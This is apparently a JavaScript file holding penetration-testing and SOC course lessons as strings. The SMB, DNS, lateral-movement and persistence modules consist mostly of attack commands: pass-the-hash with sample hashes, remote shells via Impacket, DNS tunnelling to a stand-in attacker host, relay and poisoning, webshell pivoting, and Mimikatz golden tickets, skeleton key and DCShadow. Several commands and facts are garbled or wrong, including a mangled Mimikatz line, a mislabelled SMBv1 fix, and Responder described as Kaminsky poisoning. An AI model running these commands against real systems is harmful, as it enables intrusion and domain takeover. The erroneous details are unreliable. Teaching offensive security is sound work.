        "- Session enumeration (see who is logged in)\n" +
        "- Share enumeration (find interesting files)\n" +
        "- Printer enumeration\n" +
        "- Remote command execution (via SMB to admin accounts)\n\n" +
        "SMB is a rich attack surface:\n" +
        "- Pass-the-Hash (use NTLM hash directly without cracking)\n" +
        "- SMB Relay attacks (relay SMB creds to other machines)\n" +
        "- Null sessions (anonymous access reveals a lot)\n" +
        "- SMB Signing not enforced (enables man-in-the-middle)\n" +
        "- Default/admin shares accessible with known credentials",
    },
    {
      key: 'mod18_2_1',
      title: 'enum4linux & smbclient',
      content:
        "Two essential tools for SMB enumeration. Use both — they complement each other.\n\n" +
        "enum4linux (all-in-one SMB enum):\n" +
        "enum4linux -a 10.10.10.1\n" +
        "# -a: all options (info, share enum, user list, password policy, group membership)\n\n" +
        "enum4linux -u 'username' -p 'password' 10.10.10.1\n" +
        "# With credentials - gives much more information\n\n" +
        "Key enum4linux output to analyze:\n" +
        "- Share enumeration: ADMIN$, C$, IPC$, default shares\n" +
        "- Password policy: complexity, lockout threshold, history\n" +
        "- User list: actual accounts, not just well-known ones\n" +
        "- Group membership: who is in Domain Admins, etc.\n\n" +
        "smbclient (interactive SMB shell):\n" +
        "# List shares without auth\n" +
        "smbclient -L //10.10.10.1 -N\n\n" +
        "# Connect to a share\n" +
        "smbclient //10.10.10.1/share -N\n" +
        "smbclient //10.10.10.1/share -U username%password\n\n" +
        "# Useful smbclient commands once connected:\n" +
        "ls          # List files\n" +
        "get file    # Download file\n" +
        "mget *.txt  # Download all matching files\n" +
        "put file    # Upload file\n" +
        "recurse ON  # Enable recursive directory listing\n\n" +
        "# Download all files from a share\n" +
        "smbclient //10.10.10.1/share -N -c 'prompt OFF; recurse ON; lcd /tmp/shares; mget *'\n\n" +
        "Useful one-liners:\n" +
        "smbmap -H 10.10.10.1                  # Anonymous share enumeration\n" +
        "smbmap -H 10.10.10.1 -u admin -p pass  # With credentials\n" +
        "crackmapexec smb 10.10.10.1 --pass-pol  # Password policy\n" +
        "crackmapexec smb 10.10.10.1 -u '' -p '' --shares  # Anonymous share enumeration",
    },
    {
      key: 'mod18_2_2',
      title: 'CrackMapExec & BloodHound',
      content:
        "CrackMapExec (CME) is the Swiss Army knife of Windows enumeration. It handles credentials, shares, sessions, and more.\n\n" +
        "Syntax: crackmapexec <protocol> <target> -u username -p password\n\n" +
        "SMB enumeration:\n" +
        "crackmapexec smb 10.10.10.0/24 -u anonymous -p ''\n" +
        "# Shows: which hosts are up, SMB version, if credentials work\n\n" +
        "Share enumeration:\n" +
        "crackmapexec smb 10.10.10.1 -u 'user' -p 'pass' --shares\n" +
        "# Lists all accessible shares and their permissions\n\n" +
        "Local user enumeration:\n" +
        "crackmapexec smb 10.10.10.1 -u 'user' -p 'pass' --local-users\n" +
        "# Shows all local users on the machine\n\n" +
        "Password spraying with CME:\n" +
        "crackmapexec smb 10.10.10.0/24 -u users.txt -p Summer2024!\n" +
        "# Tests one password against all users in the file\n" +
        "# CRITICAL: use --continue-on-success to keep going after first hit\n\n" +
        "BloodHound (Active Directory reconnaissance):\n" +
        "# 1. On Kali, run the ingestor\n" +
        "bloodhound-python -u 'username' -p 'password' -d target.local -c all\n" +
        "# Generates .json files in current directory\n\n" +
        "# 2. Start BloodHound GUI and upload the JSON files\n" +
        "bloodhound &\n" +
        "# Import data via the GUI: Upload Data > Select files\n\n" +
        "# 3. Find attack paths\n" +
        "- Shortest path to Domain Admin\n" +
        "- Find users with more privileges than needed\n" +
        "- Find unconstrained delegation\n" +
        "- Find Kerberoastable users\n\n" +
        "BloodHound is essential for understanding the full AD attack surface, not just individual hosts.",
    },
    {
      key: 'mod18_2_3',
      title: 'WMI & Impacket Commands',
      content:
        "Impacket is a Python library that gives you low-level network protocol access. Its tools are mandatory for Windows pentests.\n\n" +
        "Installation:\n" +
        "pip3 install impacket\n\n" +
        "wmiexec (pass-the-hash, no SMB exec needed):\n" +
        "python3 wmiexec.py 'Administrator:Password123@10.10.10.1'\n" +
        "# spawns a semi-interactive shell via WMI\n" +
        "# Much quieter than smbexec, no tools uploaded to disk\n\n" +
        "# Pass-the-hash:\n" +
        "python3 wmiexec.py -hashes 'LM:NTLM' Administrator@10.10.10.1\n" +
        "# No password needed - just the NTLM hash\n\n" +
        "psexec.py (similar to Metasploit psexec):\n" +
        "python3 psexec.py 'username:password@10.10.10.1'\n" +
        "# Creates a service on the target, executes payload, removes service\n" +
        "# Leaves an artifact (service binary in C$\\bin.exe)\n" +
        "# More likely to trigger EDR/AV than wmiexec\n\n" +
        "smbexec.py (stealthier psexec alternative):\n" +
        "python3 smbexec.py 'username:password@10.10.10.1'\n" +
        "# Uses SMB to execute commands via service creation\n" +
        "# Very similar to psexec but slightly different detection signature\n\n" +
        "Lookupsid.py (brute-force enumerate users via SID):\n" +
        "python3 lookupsid.py 'username:password@10.10.10.1'\n" +
        "# Starting with bootleg SID S-1-5-21-... 500 (Administrator)\n" +
        "# Shows every user account even if anonymous access is disabled\n\n" +
        "GetADUsers.py:\n" +
        "python3 getADUsers.py 'domain/username:password' -all\n" +
        "# Dump all AD users with their properties\n\n" +
        "ntlmrelayx.py (SMB relay attacks):\n" +
        "python3 ntlmrelayx.py -tf target.txt\n" +
        "# Relays SMB connections to target machines, executes commands automatically",
    },
    {
      key: 'mod18_2_4',
      title: 'SMB Security & Mitigation',
      content:
        "Understanding how to secure SMB helps you explain findings to clients and write better recommendations.\n\n" +
        "Critical SMB security controls:\n\n" +
        "1. Disable SMBv1 (most critical)\n" +
        "# PowerShell on each machine:\n" +
        "Set-SmbServerConfiguration -RequireSecuritySignature 1 -Force\n" +
        "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n" +
        "# Group Policy:\n" +
        "Computer Configuration > Administrative Templates > Network > Lanman Workstation\n" +
        "Enable: Enable insecure guest logins = Disabled\n\n" +
        "2. Enable SMB Signing (prevents man-in-the-middle)\n" +
        "# Required on all Windows 10+ machines\n" +
        "Set-SmbServerConfiguration -RequireSecuritySignature 1\n" +
        "# Check current status:\n" +
        "Get-SmbServerConfiguration | Select RequireSecuritySignature\n\n" +
        "3. Restrict anonymous access\n" +
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n" +
        "NullSessionShares = (empty)\n" +
        "RestrictAnonymousSAM = 1\n\n" +
        "4. Use firewall to block SMB from internet\n" +
        "# Block ports 139 and 445 on the perimeter firewall\n" +
        "- Inbound: Block 445 from 0.0.0.0/0\n" +
        "- Allow only from specific management subnets\n\n" +
        "5. Monitor for SMB relay attacks\n" +
        "- Enable SMB signing on all clients\n" +
        "- Use EPA (Extended Protection Authentication) for LDAP\n" +
        "- Enable channel binding on LDAPS\n\n" +
        "Common findings and severity:\n" +
        "- SMBv1 enabled: CRITICAL (EternalBlue, remote code execution)\n" +
        "- Null session access: HIGH (information disclosure)\n" +
        "- SMB signing not required: MEDIUM (relay attacks possible)\n" +
        "- Weak account lockout: MEDIUM (password spray opportunity)\n" +
        "- Admin shares accessible: HIGH (lateral movement enabler)",
    },
  ],
};

const mod19 = {
  title: 'Module 3: DNS Attacks & Subdomain Enum',
  lessons: [
    {
      key: 'mod19_3_0',
      title: 'DNS Fundamentals for Pentesters',
      content:
        "DNS is both a critical infrastructure service and a major attack surface. Understanding it deeply is non-negotiable.\n\n" +
        "DNS record types you will encounter:\n\n" +
        "A      # IPv4 address\n" +
        "AAAA   # IPv6 address\n" +
        "CNAME  # Alias to another domain\n" +
        "MX     # Mail server\n" +
        "NS     # Nameserver for a zone\n" +
        "TXT    # SPF, DKIM, verification strings\n" +
        "PTR    # Reverse DNS lookup\n" +
        "SRV    # Service locator (AD, SIP, etc.)\n" +
        "SOA    # Start of authority (zone admin info)\n" +
        "AXFR   # Zone transfer request\n\n" +
        "DNS enumeration commands:\n" +
        "dig AXFR target.com @ns1.target.com   # Zone transfer (if allowed)\n" +
        "dig A target.com @8.8.8.8            # A record lookup\n" +
        "dig AAAA target.com                   # IPv6 lookup\n" +
        "dig +short TXT v=spf1... target.com   # SPF record\n" +
        "host -t MX target.com                 # Mail server lookup\n" +
        "host target.com                       # All basic records\n" +
        "nslookup -type=any target.com         # All records\n\n" +
        "What to look for:\n" +
        "- SPF records revealing internal IP ranges\n" +
        "- TXT records with API keys or service tokens\n" +
        "- CNAMEs pointing to cloud resources (AWS, Azure, etc.)\n" +
        "- MX records revealing internal mail infrastructure\n" +
        "- Subdomain enumeration revealing staging/dev environments\n\n" +
        "Wildcard DNS: Many organizations protect their DNS with wildcard responses.\n" +
        "Test with a random subdomain:\n" +
        "dig random-asdlkfj.target.com\n" +
        "# If you get a result, wildcard is in effect",
    },
    {
      key: 'mod19_3_1',
      title: 'Zone Transfers & DNS Enumeration',
      content:
        "Zone transfer is when a secondary nameserver requests the full zone data from a primary. If not restricted, anyone can get the entire DNS table.\n\n" +
        "Testing for zone transfer:\n" +
        "dig axfr target.com\n" +
        "# or with specific nameserver:\n" +
        "dig axfr target.com @ns1.target.com\n\n" +
        "# In metasploit:\n" +
        "use auxiliary/gather/dns_zone_transfer\n" +
        "set DOMAIN target.com\n" +
        "run\n\n" +
        "# Using nslookup:\n" +
        "nslookup\n" +
        "> server ns1.target.com\n" +
        "> ls -d target.com\n\n" +
        "DNSenum (all-in-one DNS enumeration):\n" +
        "dnsenum target.com\n" +
        "# Automatically: zone transfer attempt, subdomain brute force, Google scraping\n\n" +
        "Subdomain enumeration with wordlists:\n" +
        "for sub in $(cat subdomains.txt); do\n" +
        "  dig $sub.target.com | grep 'has address' || echo \"$sub.target.com: NXDOMAIN\"\n" +
        "done\n" +
        "# Or use amass:\n" +
        "amass enum -passive -d target.com -o subs.txt\n\n" +
        "Knock.py (subdomain brute force tool):\n" +
        "knockpy target.com\n" +
        "# Fast, uses common subdomain wordlists\n\n" +
        "Subfinder:\n" +
        "subfinder -d target.com -o subs.txt\n" +
        "# Fast, aggregates multiple API sources (Resolv, VirusTotal, crt.sh, etc.)\n\n" +
        "CRT.sh for certificate enumeration:\n" +
        "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value'\n" +
        "# Find subdomains from certificate transparency logs",
    },
    {
      key: 'mod19_3_2',
      title: 'DNS Tunneling & C2 Channels',
      content:
        "DNS tunneling turns DNS queries into a data exfiltration channel. If outbound DNS is allowed but HTTP is blocked, DNS tunneling bypasses the restriction.\n\n" +
        "How DNS tunneling works:\n" +
        "1. Attacker controls a nameserver (attacker.com)\n" +
        "2. Victim encodes data in DNS queries: data.encoded.target.com\n" +
        "3. Queries for target.com resolve to attacker.com's nameserver\n" +
        "4. Attacker extracts encoded data from the subdomain\n" +
        "5. Response contains the next payload chunk\n\n" +
        "iodine (DNS tunneling client):\n" +
        "# On attacker server (must have subdomain configured):\n" +
        "iodined -f 10.0.0.1 tunnel.attacker.com\n" +
        "# Creates network interface tunnel0 with IP 10.0.0.1\n\n" +
        "# On victim:\n" +
        "iodine -f target.com\n" +
        "# Connects to attacker server, creates tunnel interface\n\n" +
        "dns2tcp (simpler DNS tunneling):\n" +
        "# Server:\n" +
        "dns2tcpd -f /etc/dns2tcp.conf\n\n" +
        "# Client:\n" +
        "dns2tcpc -r ssh -z tunnel.attacker.com\n" +
        "ssh -o ProxyCommand='dns2tcpc -r ssh -z tunnel.attacker.com' user@127.0.0.1\n\n" +
        "Detecting DNS tunneling:\n" +
        "- Large number of DNS queries to few domains (encoded data in subdomains)\n" +
        "- Long random subdomains (base32/hex encoded data)\n" +
        "- DNS logs showing consistent subdomain patterns\n" +
        "- TXT record queries (often used in DNS tunneling)\n" +
        "- Large DNS response sizes (AXFR-style large responses)\n\n" +
        "Practical use case: If you have code execution on a machine but cannot reach the internet via HTTP, DNS tunneling lets you create a shell over DNS.",
    },
    {
      key: 'mod19_3_3',
      title: 'Internal DNS & AD Enumeration',
      content:
        "Active Directory relies heavily on DNS. Enumerating internal DNS reveals AD infrastructure, service accounts, and more.\n\n" +
        "Internal DNS queries:\n" +
        "dig @10.10.10.1 -x 10.10.10.5      # Reverse lookup (PTR)\n" +
        "dig @10.10.10.1 _kerberos._tcp SRV # Find KDC\n" +
        "dig @10.10.10.1 _ldap._tcp SRV     # Find LDAP servers\n" +
        "dig @10.10.10.1 _gc._tcp SRV       # Global catalog servers\n\n" +
        "BloodHound for AD DNS enumeration:\n" +
        "# From a domain-joined machine:\n" +
        "bloodhound-python -u 'user' -p 'pass' -d target.local -c ALL\n" +
        "# Collects all AD data including DNS records\n\n" +
        "Active Directory DNS zone extraction:\n" +
        "powershell -c 'Get-DnsServerZoneTransfer -ZoneName \"target.local\" -Server 10.10.10.1'\n" +
        "# PowerShell native zone transfer\n\n" +
        "LDAP enumeration via DNS:\n" +
        "# Many AD services register in DNS with known patterns:\n" +
        "# _gc._tcp.<domain>      Global Catalog\n" +
        "# _ldap._tcp.<domain>     LDAP servers\n" +
        "# _kerberos._tcp.<domain> Kerberos KDC\n" +
        "# _kpasswd._tcp.<domain> Kerberos password change\n" +
        "# _sip._tcp.<domain>      Lync/Skype for Business\n\n" +
        "DNS cache poisoning (kaminsky):\n" +
        "Use responder or c2 tools to poison DNS responses on local networks.\n" +
        "responder -I eth0 --wredir --NBTNSdom\n" +
        "# Will poison DNS for all hosts on the network segment",
    },
  ],
};

const mod20 = {
  title: 'Module 4: Lateral Movement & Privilege Escalation',
  lessons: [
    {
      key: 'mod20_4_0',
      title: 'Pass-the-Hash Attacks',
      content:
        "Pass-the-Hash (PtH) is one of the most powerful techniques in Windows environments. Instead of cracking a password hash, you use the NTLM hash directly to authenticate.\n\n" +
        "Why it works:\n" +
        "- Windows uses NTLM challenge-response authentication\n" +
        "- The hash never changes (same hash = same auth)\n" +
        "- No need to know the actual password, just the hash\n" +
        "- Most tools accept NTLM hashes directly\n\n" +
        "Impacket PtH:\n" +
        "python3 wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9a4e96b14e62708e2' 'Administrator@10.10.10.1'\n" +
        "# Format: LM:NTLM or just NTLM if LM is not available\n" +
        "# Uses the hash to authenticate via WMI - no code execution tool needed\n\n" +
        "Mimikatz PtH:\n" +
        "mimikatz # sekurlsa::pth /user:Administrator /rcad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9a4e96b14e62708e2'\n" +
        "# Mimikatz spawns a process with the stolen identity\n" +
        "# Useful for accessing remote services without tool restrictions\n\n" +
        "CrackMapExec PtH:\n" +
        "crackmapexec smb 10.10.10.1 -u Administrator -H '32ed87bdb5fdc5e9a4e96b14e62708e2'\n" +
        "# Pass-the-hash with CrackMapExec for quick validation\n\n" +
        "PtH requirements:\n" +
        "- Administrator or equivalent rights needed to run the tools\n" +
        "- Target must not have SMB signing enforced (most internal networks do not)\n" +
        "- Works over ports 445 (SMB) and 135 (WMI)\n\n" +
        "Mitigation: Enable SMB signing, limit admin rights, use Protected Users security group, enable Credential Guard.",
    },
    {
      key: 'mod20_4_1',
      title: 'Token Impersonation & Switch User',
      content:
        "Tokens are Windows' way of representing a user's security context. Stealing a token lets you act as that user without needing their password.\n\n" +
        "Mimikatz token manipulation:\n" +
        "# List current tokens:\n" +
        "mimikatz # privilege::debug\n" +
        "mimikatz # token::list\n\n" +
        "# Steal token from a process:\n" +
        "mimikatz # token::revert\n" +
        "mimikatz # process::run /p:/path/to/target.exe\n" +
        "# Then steal the token from that process\n\n" +
        "# Execute as another user:\n" +
        "mimikatz # token::execute /user:TARGET\\Administrator /domain:target.local \"cmd.exe\"\n\n" +
        "Incognito (Metasploit token steal):\n" +
        "use incognito\n" +
        "list_tokens -u                # List available tokens\n" +
        "impersonate_token TARGET\\\\DomainAdmin   # Use their token\n\n" +
        "Practical scenario:\n" +
        "1. You have Meterpreter shell as local admin\n" +
        "2. run incognito\n" +
        "3. list_tokens -u  → finds DOMAIN\\ServiceAccount\n" +
        "4. impersonate_token DOMAIN\\ServiceAccount\n" +
        "5. Now have service account privileges (often more useful than local admin)\n\n" +
        "Kerberos delegation tokens:\n" +
        "- Unconstrained delegation: token includes TGT that can be reused\n" +
        "- Constrained delegation: token limited to specific services\n" +
        "- Resource-based constrained delegation: target controls who can delegate to it\n\n" +
        "Finding delegation issues:\n" +
        "PowerView: Get-NetUser -TrustedToAuth\n" +
        "PowerView: Get-NetComputer -Unconstrained\n" +
        "# If a service account has unconstrained delegation, you can get Domain Admin",
    },
    {
      key: 'mod20_4_2',
      title: 'PSExec, Winexe & Remote Execution',
      content:
        "Once you have credentials, remote execution is the gateway to full network compromise.\n\n" +
        "PSExec (Microsoft Sysinternals):\n" +
        "./psexec.py 'username:password@10.10.10.1' cmd.exe\n" +
        "# Creates a service named PSEXESVC, uploads binary, executes, cleans up\n" +
        "# Requires admin rights on the target\n\n" +
        "Winexe (exec without uploading binaries):\n" +
        "winexe -U 'username%password' //10.10.10.1 'cmd.exe'\n" +
        "# Uses SMB to execute command directly, no service binary left behind\n" +
        "# Better for avoiding detection\n\n" +
        "WinRM remote execution:\n" +
        "python3 winrm.py username:password@10.10.10.1\n" +
        "# Uses WinRM (port 5985/5986) which is often not monitored\n\n" +
        "PowerShell Remoting (best method):\n" +
        "powershell -c 'New-PSSession -ComputerName 10.10.10.1 -Credential (Get-Credential)'\n" +
        "# Enter credentials when prompted\n" +
        "# Then: Enter-PSSession <session-id>\n\n" +
        "Scheduled task remote creation:\n" +
        "schtasks /create /S 10.10.10.1 /U domain\\user /P password /SC ONCE /ST 12:00 /TN pentest /TR 'cmd.exe /c whoami'\n" +
        "schtasks /run /S 10.10.10.1 /TN pentest\n\n" +
        "WMI remote execution:\n" +
        "wmic /node:10.10.10.1 /user:domain\\user /password:password process call create \"cmd.exe /c whoami\"\n\n" +
        "Important: Always use your access to enumerate what else you can reach. Being local admin on one machine often means admin on the whole domain via PtH.",
    },
    {
      key: 'mod20_4_3',
      title: 'Port Forwarding & Pivoting',
      content:
        "When you have access to one machine, pivot to others through it. Port forwarding and SSH tunneling are essential.\n\n" +
        "SSH tunneling:\n" +
        "# Local port forward - access remote service via local port:\n" +
        "ssh -L 4444:10.10.10.5:3389 user@10.10.10.1\n" +
        "# Now connect to localhost:4444 → goes through 10.10.10.1 → reaches 10.10.10.5:3389\n\n" +
        "# Reverse tunnel - expose local service via remote host:\n" +
        "ssh -R 4444:127.0.0.1:3389 user@your-vps\n" +
        "# Attacker on VPS connects to VPS:4444 → tunnels to your Kali → reaches your localhost:3389\n\n" +
        "Chisel (HTTP-based pivoting):\n" +
        "# On your Kali (server):\n" +
        "chisel server -p 8000 --reverse\n\n" +
        "# On compromised host:\n" +
        "chisel client 10.10.10.100:8000 R:445:10.10.10.5:445\n" +
        "# Now connect to localhost:445 which tunnels to 10.10.10.5:445 through compromised host\n\n" +
        "Metasploit portfwd:\n" +
        "portfwd add -l 4444 -p 3389 -r 10.10.10.5\n" +
        "# Same concept inside Meterpreter session\n\n" +
        "Proxychains for pivoting:\n" +
        "# Edit /etc/proxychains.conf\n" +
        "socks4 127.0.0.1 1080\n\n" +
        "# Route all traffic through pivot:\n" +
        "proxychains nmap -sT -p 445 10.10.10.0/24\n" +
        "proxychains firefox http://10.10.10.5\n\n" +
        "Double pivoting (nested tunnels):\n" +
        "ssh -L 9000:localhost:9000 user@first-pivot\n" +
        "ssh -L 9000:localhost:9000 user@second-pivot\n" +
        "# You → first-pivot → second-pivot → target network\n\n" +
        "ReGeorg webshell pivot:\n" +
        "# Upload tunnel.aspx to web server\n" +
        "# On Kali:\n" +
        "python3 reGeorg.py -p 8080 -l http://target.com/tunnel.aspx",
    },
    {
      key: 'mod20_4_4',
      title: 'Persistence & Domain Dominance',
      content:
        "Once you have domain admin, the goal is persistence — maintaining access even if your initial entry point is closed.\n\n" +
        "Golden Ticket (Kerberos ticket forgery):\n" +
        "mimikatz # privilege::debug\n" +
        "mimikatz # lsadump::dcsync /user:krbtgt\n" +
        "# Get the krbtgt NTLM hash and domain SID\n\n" +
        "mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /rc4:<krbtgt_hash> /ticket:golden.kirbi\n" +
        "# Forges a TGT valid for 10 years (or whatever you specify)\n" +
        "# Even if the real admin changes password, this ticket still works\n\n" +
        "Silver Ticket (service-specific forged ticket):\n" +
        "mimikatz # kerberos::silver /user:Administrator /domain:target.local /sid:S-1-5-21-... /rc4:<service_hash> /target:dc.target.local\n" +
        "# Limited to specific service, but persists indefinitely (hash never changes)\n\n" +
        "Skeleton Key (master password on all domain controllers):\n" +
        "mimikatz # privilege::debug\n" +
        "mimikatz # misc::skeleton\n" +
        "# After running, ALL authentication on the DC uses 'mimikatz' as the password\n" +
        "# Can be detected: look for Event ID 4672 with unusual account names\n\n" +
        "DCShadow (hide in DC infrastructure):\n" +
        "# Register a fake DC, inject malicious data directly into AD\n" +
        "lsadump::dcshadow /object:CN=BuiltinAdmin /attribute:member /value:Attacker$\n\n" +
        "Practical persistence checklist:\n" +
        "- Golden Ticket (KRBTGT hash) — needs to be detected via 4769 events with unusual lifetimes\n" +
        "- Add new AD user with Domain Admin rights\n" +
        "- Modify ACLs to allow remote access\n" +
        "- Create service account for PsRemote\n" +
        "- Scheduled task on DC for command execution\n" +
        "- Registry-based backdoor (HKLM\\...\\CurrentControlSet\\Services)",
    },
  ],
};

const mod21 = {
  title: 'Module 1: SOC Fundamentals & SIEM Architecture',
  lessons: [
    {
      key: 'mod21_1_0',
      title: 'What is a SOC? Structure & Operations',
      content:
        "A Security Operations Center (SOC) is a team that monitors, detects, and responds to security events 24/7. Understanding how a SOC operates is foundational for any analyst role.\n\n" +
        "SOC tiers:\n" +
        "Tier 1 — L1 Analyst (Triage): First point of contact. Reviews alerts, determines severity, escalates if needed. High volume, fast decisions.\n" +
        "Tier 2 — L2 Analyst (Investigation): Deep-dive on escalated alerts. Correlates data, identifies attacker TTPs, coordinates response.\n" +
        "Tier 3 — L3 Analyst (Hunting): Threat hunting, malware analysis, advanced forensics, threat intelligence integration.\n" +
        "Tier 4 — SOC Manager: People, process, metrics, vendor management.\n\n" +
        "SOCs come in different models:\n" +
        "- Internal SOC: Your own security team, full control, expensive\n" +
        "- MSSP (Managed Security Service Provider): Outsourced monitoring, shared responsibility\n" +
        "- Hybrid: Internal team for critical assets, MSSP for commodity monitoring\n" +
        "- Command center: Combines SOC with NOC (Network Operations Center)\n\n" +
        "SOP (Standard Operating Procedure): Every alert should have a documented response procedure. No improvisation during an incident.\n\n" +
        "Key metrics SOCs track:\n" +
        "- MTTD: Mean Time to Detect\n" +
        "- MTTT: Mean Time to Triage\n" +
        "- MTTR: Mean Time to Respond/Resolve\n" +
        "- Alert volume per analyst per shift\n" +
        "- False positive rate (high FP = wasted time)\n\n" +
        "In Nigeria/Africa context:\n" +
        "- Most organizations lack in-house SOCs — huge job opportunity\n" +
        "- Outsourced MSSPs are growing fast (Securex, Liquid Telecom, etc.)\n" +
        "- Remote SOC analyst roles available globally (US/EU companies hire African analysts)",
    },
    {
      key: 'mod21_1_1',
      title: 'SIEM Fundamentals: How Splunk Works',
      content:
        "A SIEM (Security Information and Event Management) system collects logs from everywhere, normalizes them, and lets you search/correlate across all of them in real time. Splunk is the industry leader.\n\n" +
        "Splunk core concepts:\n\n" +
        "Forwarders: Lightweight agents installed on endpoints that send logs to the indexer.\n" +
        "Indexer: The server that stores and indexes log data. Search head is where you query.\n" +
        "Search head: The web interface where analysts run queries.\n\n" +
        "Basic Splunk search:\n" +
        "index=main source=\"WinEventLog:Security\" EventCode=4625\n" +
        "# Find failed logins from Windows Security log\n\n" +
        "index=main source=\"*access*\" status=200\n" +
        "# Find successful web access logs\n\n" +
        "Key Splunk commands:\n" +
        "table time, src, dest, user           # Format output as table\n" +
        "stats count by user                   # Aggregate by field\n" +
        "rename dest as Destination            # Rename field for readability\n" +
        "sort -count                           # Sort descending\n" +
        "top 10 src                            # Most common values\n" +
        "timechart span=1h avg(bytes) by src   # Time-series visualization\n\n" +
        "Splunk SPL (Search Processing Language):\n" +
        "index=main | where bytes > 1000000 | stats count by src\n" +
        "# Pipe-based, chain operations\n\n" +
        "Field extraction:\n" +
        "Sourcetype tells Splunk how to parse logs (iis:access_log, wineventlog:security, etc.)\n" +
        "You can extract custom fields with regex in transforms.conf or directly in search\n" +
        " rex \"(?<src_ip>\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+)\"\n\n" +
        "Alerting:\n" +
        "Saved Search → Alert → Trigger condition (e.g., more than 5 failed logins in 5 minutes)\n" +
        "Alert actions: Email, script, webhook, PagerDuty, Slack",
    },
    {
      key: 'mod21_1_2',
      title: 'Splunk SPL for Security Analysts',
      content:
        "Writing good SPL is what separates junior from senior analysts. Learn these patterns and you will solve most investigation problems.\n\n" +
        "Basic event investigation:\n" +
        "index=main src=10.10.10.5 earliest=-24h@h latest=now\n" +
        "# Look at all events from a specific IP in last 24 hours\n" +
        "# @h = start of current hour\n\n" +
        "String searching:\n" +
        "index=main \"password\" \"failed\"\n" +
        "# Search for events containing both words\n\n" +
        "Wildcard and regex:\n" +
        "index=main src=\"10.10.10.*\"\n" +
        "index=main | regex dest=\"\\\\.target\\\\.com$\"\n\n" +
        "Time modifiers:\n" +
        "earliest=-7d@d          # Last 7 days, start of each day\n" +
        "earliest=-1h@h          # Last hour, start of the hour\n" +
        "earliest=-30m@m         # Last 30 minutes, start of minute\n" +
        "earliest=01/01/2026:00:00:00 latest=01/02/2026:00:00:00\n\n" +
        "Building detection searches:\n" +
        "# Brute force detection (Windows):\n" +
        "index=main source=\"WinEventLog:Security\" EventCode=4625\n" +
        "| stats count by src, user\n" +
        "| where count > 10\n" +
        "| eval severity=if(count>50, \"HIGH\", \"MEDIUM\")\n\n" +
        "# Data exfiltration (large outbound):\n" +
        "index=main sourcetype=firewall\n" +
        "| stats sum(bytes_out) as total_bytes by src\n" +
        "| where total_bytes > 1000000000\n\n" +
        "# Lateral movement (rare internal connections):\n" +
        "index=main sourcetype=firewall dest_private=10.10.10.0/24\n" +
        "| stats count by src, dest\n" +
        "| sort 20 count\n\n" +
        "Subsearches (search within search results):\n" +
        "[search index=main EventCode=4625 | stats count as attempts by user | where attempts > 10 | table user]\n" +
        "| search EventCode=4625 user=$result$\n" +
        "# First find users with >10 failed logins, then show all their login events",
    },
    {
      key: 'mod21_1_3',
      title: 'Log Sources & Normalization',
      content:
        "A SIEM is only as good as its logs. Understanding what logs to collect and how to normalize them is half the battle.\n\n" +
        "Essential log sources for SOC:\n\n" +
        "NETWORK:\n" +
        "- Firewall (Palo Alto, Fortinet, Check Point, iptables)\n" +
        "- IDS/IPS (Suricata, Snort, Cisco Firepower)\n" +
        "- NetFlow/sFlow (what conversations happened, not content)\n" +
        "- DNS logs (critical for malware C2 detection)\n" +
        "- Proxy logs (web filtering, URL logs)\n\n" +
        "ENDPOINT:\n" +
        "- Windows Event Logs (Security, System, Application)\n" +
        "- Syslog (Linux servers)\n" +
        "- EDR (CrowdStrike, SentinelOne, Defender for Endpoint)\n" +
        "- Anti-virus logs\n\n" +
        "IDENTITY:\n" +
        "- Active Directory (logon events, account changes)\n" +
        "- Azure AD / Identity Provider logs\n" +
        "- VPN logs (who connected from where)\n\n" +
        "APPLICATION:\n" +
        "- Web server logs (Apache, Nginx, IIS)\n" +
        "- Email logs (Exchange, M365, Proofpoint)\n" +
        "- Database audit logs\n\n" +
        "Normalization (field mapping):\n" +
        "Different sources use different field names for the same concept:\n" +
        "Firewall: src_ip=192.168.1.5, dest_ip=10.10.10.1\n" +
        "Windows: Workstation=192.168.1.5, DestinationIp=10.10.10.1\n" +
        "Apache: clientip=192.168.1.5, domain=10.10.10.1\n\n" +
        "Splunk handles this via:\n" +
        "- props.conf: tells Splunk how to parse each sourcetype\n" +
        "- transforms.conf: maps source fields to common field names\n" +
        "- Common Information Model (CIS): Splunk's standardized field naming (src, dest, user, etc.)\n\n" +
        "Minimum viable log collection for an analyst to care:\n" +
        "1. Windows Security logs (4624, 4625, 4672, 4720, etc.)\n" +
        "2. Firewall traffic logs\n" +
        "3. DNS query logs\n" +
        "4. EDR telemetry\n" +
        "Without these four, you are effectively blind.",
    },
    {
      key: 'mod21_1_4',
      title: 'Creating Dashboards & Visualizations',
      content:
        "Dashboards turn raw data into actionable intelligence. Learn to build them so your SOC leadership can make decisions at a glance.\n\n" +
        "Splunk dashboard building blocks:\n\n" +
        "Single Value (gauge):\n" +
        "index=main EventCode=4624\n" +
        "| stats count as logins_today\n" +
        "| eval threshold=1000\n" +
        "| eval status=if(logins_today>threshold, \"HIGH\", \"NORMAL\")\n\n" +
        "Line chart (time-series):\n" +
        "index=main\n" +
        "| timechart count by EventCode\n" +
        "# Shows event volume over time, broken down by type\n\n" +
        "Bar chart (top offenders):\n" +
        "index=main EventCode=4625\n" +
        "| top src by count\n" +
        "# Shows which IPs are causing the most failed logins\n\n" +
        "Choropleth map (geographic):\n" +
        "index=main src_country=*\n" +
        "| geom lookup=us_states\n" +
        "# Shows attacks by geographic region\n\n" +
        "Building a SOC executive dashboard:\n\n" +
        "Panel 1 — Total alerts today: single value, red if above baseline\n" +
        "Panel 2 — Top 5 alert categories (pie chart)\n" +
        "Panel 3 — Events by hour (column chart) — spot after-hours anomalies\n" +
        "Panel 4 — Top talkers (IPs with most connections)\n" +
        "Panel 5 — Recent critical alerts (event table)\n\n" +
        "Dynamic lookups in dashboards:\n" +
        "Use input(search) to make panels interactive\n" +
        "When you click on an IP in panel 1, panel 2 shows all events from that IP\n\n" +
        "Best practices:\n" +
        "- Dashboards should load in under 5 seconds\n" +
        "- Use earliest=-24h@h by default (not -1h, not -30d)\n" +
        "- Color-code based on thresholds (green/yellow/red)\n" +
